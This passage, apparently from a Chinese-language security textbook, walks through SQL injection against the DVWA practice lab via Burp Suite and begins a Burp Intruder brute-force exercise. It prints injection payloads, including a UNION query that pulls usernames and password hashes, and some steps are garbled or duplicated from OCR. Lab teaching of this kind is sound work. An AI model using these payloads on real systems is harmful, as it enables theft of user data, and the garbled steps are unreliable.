

# DVWA 的 SQL 注入攻击

![](img/8c6a223c57e25ea0cc1593903a1b920f_379_0.png)

| 首页 |
| --- |
| 指南 |
|  Setup / 重置数据库 |
| 暴力破解 |
| 命令注入 |
| CSRF 攻击 |
| 文件包含 |
| 文件上传 |
| 不安全的 CAPTCHA |
| SQL 注入 |
| 弱的 Session ID |
| XSS (DOM) |
| XSS (反射型) |
| XSS (存储型) |
| CSP 绕过 |

用户 ID: [1] 提交

ID: 1 OR 1=1#
名: admin
姓: admin

ID: 1 OR 1=1#
名: Gordon
姓: Brown

ID: 1 OR 1=1#
名: Hack
姓: Me

ID: 1 OR 1=1#
名: Pablo
姓: Picasso

ID: 1 OR 1=1#
名: Bob
姓: Smith

更多信息

图 12.21 – 在 Web 应用中不应显示的数据

15. 点击“提交”以在 Burp Suite 中刷新显示的数据。然后，将 ID 的值改为以下内容：

```
1 OR 1=1 SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
```

16. 现在，如果你回到 DVWA，你会发现这次我们获得了更多信息，包括表名。这是一个非常严重的漏洞，因为攻击者可以从我们的 Web 应用获取非常敏感的数据。现在，我们发现了一个更严重的危及信息安全的漏洞，如下截图所示：

```
ID: 1 OR 1-1 SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
名:
姓: users

ID: 1 OR 1-l=1 SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
名:
姓: guestbook
```

# 更多信息

图 12.22 – 从 Web 应用泄露的数据库信息

17. 利用这些信息，我们可以测试是否能从该 Web 应用中检索更敏感的数据，因此让我们尝试以下命令：

```
1 OR 1=1 UNION SELECT USER, PASSWORD FROM users#
```

如果你回到 DVWA，你应该能看到所有显示的密码哈希值，如下截图所示：

# 漏洞：SQL 注入

![](img/8c6a223c57e25ea0cc1593903a1b920f_380_0.png)

# 更多信息

> 图 12.23 – 从 Web 应用泄露的哈希密码

现在，让我们看看在执行此实验时可能会遇到什么常见错误。

# 修复常见错误

你是否收到了与图 12.24 所示相同的错误？如果是，不要担心——很容易修复。只需回到 Burp Suite，将 Intercept（拦截）设置为 Off（关闭），然后刷新 DVWA，一切应该恢复正常。

此外，请记住这些值是区分大小写的，因此请确保你使用正确的大小写以避免错误，如下截图所示：

```
127.0.0.1/DVWA/vulnerabilities/sqli/
http://127.0.0.1/DVWA/vulnerabilities/sqli/
```

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right

图 12.24 – DVWA 错误

现在，让我们进行另一个测试，看看 Web 应用是否受到暴力破解攻击。

# 暴力破解 Web 应用密码

在这里，我们将使用一直以来使用的两个应用，因此直接进入以下步骤：

- 进入 Burp Suite 并确保 Intercept 为 OFF（关闭）。
- 进入 DVWA 并从左侧菜单选择 Brute force（暴力破解）。
- 在用户名处输入 `admin`，在密码处输入 `12345`（先不要点击登录）。
- 回到 Burp Suite 并将 Intercept 设置为 ON（开启）。
- 现在，你应该能看到所有数据，包括输入的用户名和密码值。
- 点击顶部菜单上的 Action（操作）按钮，然后选择 Sent to Intruder（发送到攻击者），如下截图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_381_0.png)

图 12.25 – Burp Suite  Action 菜单

7. 现在，你应该会看到 Intruder 菜单现在呈红色高亮，因此点击顶部菜单中的 Intruder，如下截图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_382_0.png)

图 12.26 – Intruder 菜单

8. 进入顶部菜单上的 Positions（位置）。在这里，你可以看到我们将在载荷中使用的参数或变量。通常情况下，它会默认识别一些，在这种情况下，让我们先清除它们。

9. 现在，让我们清除它们。进入顶部菜单上的 Positions。在这里，你可以看到我们将在载荷中使用的参数或变量。通常情况下，它会默认识别一些，在这种情况下，让我们先清除它们。

10. 现在，你应该会看到 Intruder 菜单现在呈红色高亮，因此点击顶部菜单中的 Intruder，如下截图所示：

![](img/8c6a223c57e25ea0cc1593903a1b920f_382_0.png)

图 12.26 – Intruder 菜单

（由于原文存在大量重复的 OCR 文本，此处已按要求进行清理并处理逻辑流程）

